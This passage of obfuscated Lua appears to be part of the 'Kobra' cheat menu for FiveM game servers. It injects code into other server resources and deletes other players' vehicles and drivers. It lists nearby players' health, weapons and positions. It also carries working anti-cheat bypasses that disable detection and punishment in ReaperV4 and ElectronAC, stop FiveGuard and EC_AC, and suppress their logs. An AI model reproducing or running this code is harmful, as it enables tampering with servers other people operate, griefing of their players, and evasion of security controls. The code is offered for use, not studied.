0),v1315,0);v1323,v1324,v1325,v1323,v1326=GetShapeTestResult(v1322);v1327=nil;function v1327(v1576) if ( not v1576 or  not DoesEntityExist(v1576)) then return;end local v1577=GetPedInVehicleSeat(v1576, -1);if ((v1577~=0) and DoesEntityExist(v1577)) then SetPedIntoVehicle(v1315,v1576,1157 -(775 + 382) );v1313(v1576,2863 -863 );Wait(10);for v1627=607 -(45 + 562) ,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1577   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1315,v1576, -(863 -(545 + 317)));Wait(1 -0 );SetPedIntoVehicle(v1315,v1576,GetEmptySeat(v1576));Wait(1027 -(763 + 263) );SetPedIntoVehicle(v1315,v1576, -1);Wait(450);ClearPedTasksImmediately(v1315);Wait(60 + 190 );SetPedIntoVehicle(v1315,v1576, -1);end end CreateThread(function() if v1324 then if ((v1326~=0) and IsEntityAVehicle(v1326)) then local v1637=1750 -(512 + 1238) ;local v1638;while true do if ((1594 -(272 + 1322))==v1637) then v1638=v1326;v1327(v1638);break;end end end end end);break;end end end elseif (v816=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1328=0 -0 ;local v1329;while true do if (v1328==0) then v1329=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1329,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1485,v1486) local v1487=0;local v1488;while true do if (v1487==1) then _G[v1485]=function(...) return v1486(v1488,...);end;break;end if (v1487==0) then v1488=_G[v1485];if ( not v1488 or (type(v1488)~="function")) then return;end v1487=1;end end end hNative("CreateThread",function(v1489,...) return v1489(...);end);hNative("Wait",function(v1490,...) return v1490(...);end);hNative("DoesEntityExist",function(v1491,...) return v1491(...);end);hNative("GetEntityCoords",function(v1492,...) return v1492(...);end);hNative("GetCamCoord",function(v1493,...) return v1493(...);end);hNative("GetCamRot",function(v1494,...) return v1494(...);end);hNative("StartShapeTestRay",function(v1495,...) return v1495(...);end);hNative("GetShapeTestResult",function(v1496,...) return v1496(...);end);hNative("GetPedInVehicleSeat",function(v1497,...) return v1497(...);end);hNative("SetEntityVisible",function(v1498,...) return v1498(...);end);hNative("DeletePed",function(v1499,...) return v1499(...);end);hNative("ClearPedTasksImmediately",function(v1500,...) return v1500(...);end);hNative("SetEntityCoordsNoOffset",function(v1501,...) return v1501(...);end);hNative("IsEntityAVehicle",function(v1502,...) return v1502(...);end);hNative("SetPedIntoVehicle",function(v1503,...) return v1503(...);end);hNative("PlayerPedId",function(v1504,...) return v1504(...);end);hNative("NetworkRequestControlOfEntity",function(v1505,...) return v1505(...);end);hNative("NetworkHasControlOfEntity",function(v1506,...) return v1506(...);end);local function v1441(v1507,v1508) v1508=v1508 or (3246 -(533 + 713)) ;local v1509=GetGameTimer();while (GetGameTimer() -v1509)<v1508  do local v1578=28 -(14 + 14) ;while true do if (v1578==(825 -(499 + 326))) then if NetworkHasControlOfEntity(v1507) then return true;end NetworkRequestControlOfEntity(v1507);v1578=1 -0 ;end if (v1578==(425 -(104 + 320))) then Wait(0);break;end end end return NetworkHasControlOfEntity(v1507);end local function v1442(v1510) local v1511=0;local v1512;local v1513;local v1514;while true do if (v1511==(1997 -(1929 + 68))) then v1512=math.rad(v1510.z);v1513=math.rad(v1510.x);v1511=1;end if (v1511==(1324 -(1206 + 117))) then v1514=math.abs(math.cos(v1513));return vector3( -math.sin(v1512) * v1514 ,math.cos(v1512) * v1514 ,math.sin(v1513));end end end function GetEmptySeat(v1515) local v1516={ -(1593 -(683 + 909)),0 -0 ,1,2};for v1579,v1580 in ipairs(v1516) do if IsVehicleSeatFree(v1515,v1580) then return v1580;end end return  -(778 -(772 + 5));end local v1443=PlayerPedId();local v1444=GetEntityCoords(v1443);local v1445=GetCamCoord(_G.KobraFreecamObject);local v1446=GetCamRot(_G.KobraFreecamObject,1429 -(19 + 1408) );local v1447=v1442(v1446);local v1448=1288 -(134 + 154) ;local v1449=v1445 + (v1447 * v1448) ;local v1450=StartShapeTestRay(v1445.x,v1445.y,v1445.z,v1449.x,v1449.y,v1449.z, -(1 -0),v1443,0 -0 );local v1451,v1452,v1453,v1451,v1454=GetShapeTestResult(v1450);local function v1455(v1517) local v1518=0 + 0 ;local v1519;while true do if (v1518==(1 + 0)) then if ((v1519~=0) and DoesEntityExist(v1519)) then SetPedIntoVehicle(v1443,v1517,0);v1441(v1517,2202 -(10 + 192) );Wait(57 -(13 + 34) );for v1644=1289 -(342 + 947) ,16 -12  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1519   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1443,v1517, -(1709 -(119 + 1589)));Wait(2 -1 );SetPedIntoVehicle(v1443,v1517,GetEmptySeat(v1517));Wait(1 -0 );SetPedIntoVehicle(v1443,v1517, -(553 -(545 + 7)));Wait(450);ClearPedTasksImmediately(v1443);SetEntityCoordsNoOffset(v1443,v1444.x,v1444.y,v1444.z,true,true,true,true);Wait(100);MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1517   .. [[)
                                    ]] );else local v1639=0;while true do if (v1639==(2 -1)) then MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1517   .. [[)
                                    ]] );Wait(100);v1639=2;end if ((1 + 1)==v1639) then SetEntityCoordsNoOffset(v1443,v1444.x,v1444.y,v1444.z,true,true,true,true);break;end if (v1639==(1703 -(494 + 1209))) then SetPedIntoVehicle(v1443,v1517, -(2 -1));Wait(100);v1639=999 -(197 + 801) ;end end end break;end if (v1518==(0 -0)) then if ( not v1517 or  not DoesEntityExist(v1517)) then return;end v1519=GetPedInVehicleSeat(v1517, -(4 -3));v1518=955 -(919 + 35) ;end end end CreateThread(function() if v1452 then if ((v1454~=0) and IsEntityAVehicle(v1454)) then local v1628=0;local v1629;while true do if (v1628==(0 + 0)) then v1629=v1454;v1455(v1629);break;end end end end end);end end end end local v473=v17[v15];if v473 then if ((v473.type=="slider") or (v473.type=="slider-checkbox")) then local v817=0 -0 ;local v818;local v819;while true do if ((467 -(369 + 98))==v817) then v818=v473.max or (1215 -(400 + 715)) ;v819=GetGameTimer();v817=1 + 0 ;end if (v817==(1 + 0)) then if (v818<=(1335 -(744 + 581))) then if (IsControlPressed(0 + 0 ,1796 -(653 + 969) ) and ((v819-v287)>v288)) then v12:ScrollTwo("Left");v287=v819;elseif (IsControlPressed(0 -0 ,175) and ((v819-v287)>v288)) then local v1286=1631 -(12 + 1619) ;while true do if (v1286==0) then v12:ScrollTwo("Right");v287=v819;break;end end end elseif IsControlPressed(0,174) then v12:ScrollTwo("Left");elseif IsControlPressed(163 -(103 + 60) ,175) then v12:ScrollTwo("Right");end break;end end end end end end);local v101=0 -0 ;local v102=524 -404 ;local v103=0;local v104=571 -451 ;local v105=0;local v106=120;MachoOnKeyDown(function(v289) local v290=tonumber(v289) or v289 ;local v291=v44[v290] or "Unknown" ;local v292=GetGameTimer();if (v291==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v291=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v291=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v291=="Q") and ((v292-v105)>v106)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v291=="E") and ((v292-v105)>v106)) then if (v13 and v24) then v12:NextCategory();end elseif ((v291=="ArrowUp") and ((v292-v101)>v102)) then if v13 then v12:ScrollOne("Up");v101=v292;end elseif ((v291=="ArrowDown") and ((v292-v101)>v102)) then if v13 then local v1354=0;while true do if (0==v1354) then v12:ScrollOne("Down");v101=v292;break;end end end elseif (v291=="ArrowLeft") then local v1355=1662 -(710 + 952) ;local v1356;while true do if (v1355==(1868 -(555 + 1313))) then v1356=v17[v15];if v1356 then if ((v1356.type=="slider") or ((v1356.type=="slider-checkbox") and ((v292-v103)>v104))) then local v1640=v1356.max or (92 + 8) ;local v1641=GetGameTimer();if (v1640<=(9 + 1)) then v12:ScrollTwo("Left");v103=v1641;else v12:ScrollTwo("Left");end elseif ((v1356.type=="scrollable") or (v1356.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end break;end end elseif (v291=="ArrowRight") then local v1520=v17[v15];if v1520 then if ((v1520.type=="slider") or ((v1520.type=="slider-checkbox") and ((v292-v103)>v104))) then local v1630=v1520.max or 100 ;local v1631=GetGameTimer();if (v1630<=10) then local v1645=0;while true do if ((0 + 0)==v1645) then v12:ScrollTwo("Right");v103=v1631;break;end end else v12:ScrollTwo("Right");end elseif ((v1520.type=="scrollable") or (v1520.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end elseif (v291=="F5") then local v1591=v17[v15];if (v13 and v24 and v1591 and ((v1591.type=="button") or (v1591.type=="checkbox") or (v1591.type=="slider-checkbox"))) then local v1632=1468 -(1261 + 207) ;while true do if (v1632==(252 -(245 + 7))) then v12:HideUI();Wait(997 -(212 + 535) );v1632=4 -3 ;end if (v1632==(1477 -(905 + 571))) then v59(("Bind %s"):format(v1591.label),"",function(v1649) for v1650,v1651 in pairs(v44) do if (v1651:lower()==v1649:lower()) then local v1653=0;local v1654;while true do if (v1653==(0 -0)) then v1654=v45[v1650];for v1661,v1662 in pairs(v25) do if (v1662.keyRaw==v1650) then local v1664=0 -0 ;while true do if (v1664==0) then v12:Notify("error","Kobra","There is already a keybind with that key!",11865 -8865 );return;end end end end v1653=1 + 0 ;end if (v1653==1) then if v1654 then local v1663=1463 -(522 + 941) ;while true do if (0==v1663) then v25[ #v25 + (1512 -(292 + 1219)) ]={key=v1654,keyRaw=v1650,keyLabel=v44[v1650],type=v1591.type,label=v1591.label,checked=v1591.checked or false ,value=v1591.value or (1113 -(787 + 325)) ,step=v1591.step or (0.25 -0) ,min=v1591.min or (0.25 + 0) ,max=v1591.max or (11 -6) ,onSelect=v1591.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(500);v1653=2;end if (v1653==2) then v12:ShowUI();return;end end end end end,"keybind");break;end end end elseif v24 then for v1642,v1643 in pairs(v25) do if (v1643.type=="button") then local v1646=v1643.keyRaw;if v1646 then if (v1646==v290) then local v1655=534 -(424 + 110) ;while true do if (v1655==(0 + 0)) then v1643.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1643.label),1779 + 1221 );break;end end end end elseif (v1643.type=="checkbox") then local v1652=v1643.keyRaw;if (v1652 and (v1652==v290)) then local v1656=0 + 0 ;while true do if (v1656==1) then if v1643.onSelect then v1643.onSelect(v1643.checked);end v12:ShowKeybindList(v25);v1656=314 -(33 + 279) ;end if (v1656==0) then v1643.checked= not v1643.checked;v12:UpdateTabChecked(v16,v1643.label,v1643.checked);v1656=1;end if (v1656==(1 + 1)) then v12:Notify((v1643.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1643.checked and "enabled") or "disabled" ,v1643.label),4353 -(1338 + 15) );if v13 then v12:UpdateElements(v17);end break;end end end elseif (v1643.type=="slider-checkbox") then local v1657=v1643.keyRaw;if (v1657 and (v1657==v290)) then v1643.checked= not v1643.checked;v12:UpdateTabChecked(v16,v1643.label,v1643.checked);if v1643.onSelect then v1643.onSelect(v1643.value,v1643.checked);end v12:ShowKeybindList(v25);v12:Notify((v1643.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1643.checked and "enabled") or "disabled" ,v1643.label),4423 -(528 + 895) );if v13 then v12:UpdateElements(v17);end end end end end end);v12.InListMenu=function(v293) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v294) if ( not v18 or  not v18[v19]) then return;end local v295=v18[v19];if (v295.label~="List") then return;end for v474,v475 in ipairs(v295.tabs) do if (v475.type=="checkbox") then local v656=0;while true do if ((0 + 0)==v656) then v475.checked=true;if (v475.serverId and tonumber(v475.serverId)) then v27[tonumber(v475.serverId)]=true;end break;end end end end v294:UpdateElements(v17);end;v12.UnselectEveryone=function(v296) if ( not v18 or  not v18[v19]) then return;end local v297=v18[v19];if (v297.label~="List") then return;end for v476,v477 in ipairs(v297.tabs) do if (v477.type=="checkbox") then local v657=0;while true do if (v657==0) then v477.checked=false;if (v477.serverId and tonumber(v477.serverId)) then v27[tonumber(v477.serverId)]=false;end break;end end end end v296:UpdateElements(v17);end;v12.ClearSelection=function(v298) local v299=1924 -(1606 + 318) ;while true do if (v299==0) then v27={};if (v18 and v18[v19]) then local v820=v18[v19];if ((v820.label=="List") and v820.tabs) then for v942,v943 in ipairs(v820.tabs) do if (v943.type=="checkbox") then v943.checked=false;end end end end v299=1820 -(298 + 1521) ;end if (1==v299) then v12:UnselectEveryone();break;end end end;v12.UpdateListMenu=function(v300) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v301=v18[v19];if (v301.label~="List") then return;end local v302=GetEntityCoords(PlayerPedId());if  not v302 then return;end local v303=v300:GetNearbyPlayers(v302,1504 -1154 ,true);local v304;for v478,v479 in ipairs(v301.tabs) do if ((v479.type=="divider") and (v479.label=="Nearby Players")) then v304=v478;break;end end if  not v304 then return;end for v480= #v301.tabs,v304 + (311 -(154 + 156)) , -(3 -2) do table.remove(v301.tabs,v480);end if ( #v303==(0 -0)) then v301.tabs[ #v301.tabs + 1 ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v303,function(v658,v659) return tonumber(v658.serverId)<tonumber(v659.serverId) ;end);for v660,v661 in ipairs(v303) do local v662=tonumber(v661.serverId);if (v662 and v661.name) then local v821,v822=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v662)));v301.tabs[ #v301.tabs + (1116 -(712 + 403)) ]={type="checkbox",label=("%s - [%s]"):format(v661.name,v662),serverId=v662,checked=v27[v662] or false ,name=v661.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v662)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v662)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v662)))~=(450 -(168 + 282))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v662))) , -(1 -0))==GetPlayerPed(GetPlayerFromServerId(v662))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v662)))))   .. ".0m" },{key="Server ID",value=v662},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v662))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v662))),color="0, 132, 255"},{key="Weapon",value=v28[v822] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v662)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v662)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v662))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v662))) * (6.6 -3) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v662))) and "Visible") or "Invisible" }},onSelect=function(v856) v27[v662]=v856 or false ;end};end end end for v481,v482 in pairs(v27) do local v483=0 -0 ;local v484;while true do if (v483==(1 + 0)) then if  not v484 then v27[v481]=nil;end break;end if (v483==(1947 -(1427 + 520))) then v484=false;for v824,v825 in ipairs(v303) do if (tonumber(v825.serverId)==tonumber(v481)) then v484=true;break;end end v483=1;end end end v15=math.min(v15 or (1 + 0) ,math.max(1, #v301.tabs));local v305,v306=pcall(function() v300:UpdateElements(v17);end);if  not v305 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v306) );end end;v12.AssignListMenuActions=function(v307) local v308=0;while true do if (v308==(0 -0)) then if  not v16 then return;end for v742,v743 in ipairs(v16) do if ((v743.label=="Server") and v743.categories) then for v904,v905 in ipairs(v743.categories) do if ((v905.label=="List") and v905.tabs) then for v1035,v1036 in ipairs(v905.tabs) do if (v1036.type=="button") then if (v1036.label=="Select Everyone") then v1036.onSelect=function() v12:SelectEveryone();end;elseif (v1036.label=="Un-Select Everyone") then v1036.onSelect=function() v12:UnselectEveryone();end;elseif (v1036.label=="Clear Selection") then v1036.onSelect=function() v12:ClearSelection();end;end end end end end end end break;end end end;CreateThread(function() while true do local v485=0;while true do if (v485==(0 + 0)) then Wait(2732 -(712 + 520) );if (v12:InListMenu() and v13) then local v859=0 -0 ;local v860;local v861;while true do if ((1346 -(565 + 781))==v859) then v860,v861=pcall(function() v12:UpdateListMenu();end);if  not v860 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v861) );end break;end end end break;end end end end);Wait(1565 -(35 + 530) );v12:AssignListMenuActions();local v113=nil;local v114=nil;local function v115() local v309=0 + 0 ;while true do if (v309==0) then for v744=0 -0 ,GetNumResources() -(1379 -(1330 + 48))  do local v745=0 + 0 ;local v746;local v747;while true do if (v745==(1 + 0)) then if (v747 and (string.find(v747,"https://electron-services.com") or string.find(v747,"Electron Services") or string.find(v747,"The most advanced fiveM anticheat"))) then local v963=0 -0 ;while true do if (v963==(4 -3)) then return v746;end if (v963==(1169 -(854 + 315))) then v113=v746;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v746 );v963=3 -2 ;end end end break;end if (v745==(0 + 0)) then v746=GetResourceByFindIndex(v744);v747=LoadResourceFile(v746,"fxmanifest.lua");v745=45 -(31 + 13) ;end end end return nil;end end end local function v116() local v310=0 -0 ;while true do if ((0 -0)==v310) then for v748=0 + 0 ,GetNumResources() -(564 -(281 + 282))  do local v749=GetResourceByFindIndex(v748);local v750=GetNumResourceMetadata(v749,"client_script");for v826=0 -0 ,v750-1  do local v827=0 + 0 ;local v828;while true do if (v827==(949 -(216 + 733))) then v828=GetResourceMetadata(v749,"client_script",v826);if (v828 and string.find(v828,"obfuscated")) then v114=v749;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v749 );return v749;end break;end end end end return nil;end end end v12.LoadBypass=function(v311) local v312=1847 -(137 + 1710) ;local v313;local v314;while true do if (v312==(2 -1)) then for v751,v752 in ipairs(v313) do if (v314==v752) then v311:Notify("error","Kobra","Bypass disabled for this server.",3538 -(100 + 438) );return;end end v311:Notify("info","Kobra","Loading Anticheat Bypass...",4365 -(205 + 1160) );v312=2 + 0 ;end if ((2 + 1)==v312) then Wait(2305 -(535 + 770) );if (GetResourceState("ReaperV4")=="started") then local v829=0 + 0 ;while true do if (v829==(2 + 1)) then print("ReaperV4 Bypass Enabled");v311:Notify("info","Kobra","ReaperV4 Bypass Loaded",4994 -(211 + 1783) );break;end if (v829==(0 + 0)) then MachoInjectResource2(1431 -(1236 + 193) ,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -(793 + 117) ,function(...) return false,false;end);v829=1893 -(1607 + 285) ;end if (v829==1) then MachoHookNative(10181871000000000000,function(...) return false,863 -(747 + 113) ;end);MachoHookNative(12777102000000000000,function(...) return false,true;end);v829=1978 -(80 + 1896) ;end if (v829==2) then MachoHookNative(15349248000000000000 -0 ,function(...) return false,0;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);v829=5 -2 ;end end elseif (v113~=nil) then local v906=0;while true do if (0==v906) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(2 + 0 ,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v114~=nil) then local v964=0 -0 ;while true do if (v964==(0 + 0)) then CreateThread(function() while true do local v1288=0 -0 ;while true do if (v1288==(0 + 0)) then MachoResourceStop(v114);print("^7[^5Kobra^7]: Stopped Resource: "   .. v114 );v1288=1 + 0 ;end if (v1288==(2 -1)) then Wait(2454 -(246 + 208) );break;end end end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v1101=1892 -(614 + 1278) ;local v1102;while true do if (v1101==2) then CreateThread(function() while true do local v1358=0 + 0 ;while true do if ((314 -(249 + 65))==v1358) then Wait(0);MachoResourceStop("EC_AC");break;end end end end);break;end if (v1101==0) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v1101=2 -1 ;end if (v1101==1) then v1102={"EC_AC"};for v1330=1276 -(726 + 549) , #v1102 do local v1331=v1102[v1330];MachoInjectResource(v1331,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(1050);end v1101=2 + 0 ;end end end v312=1428 -(916 + 508) ;end if ((13 -9)==v312) then if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",3000);elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",1930 + 1070 );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",3000);elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",3323 -(140 + 183) );end break;end if (v312==0) then v313={"216.146.24.88:30120","91.190.154.74:30120"};v314=GetCurrentServerEndpoint();v312=565 -(297 + 267) ;end if (v312==(2 + 0)) then v115();v116();v312=3;end end end;
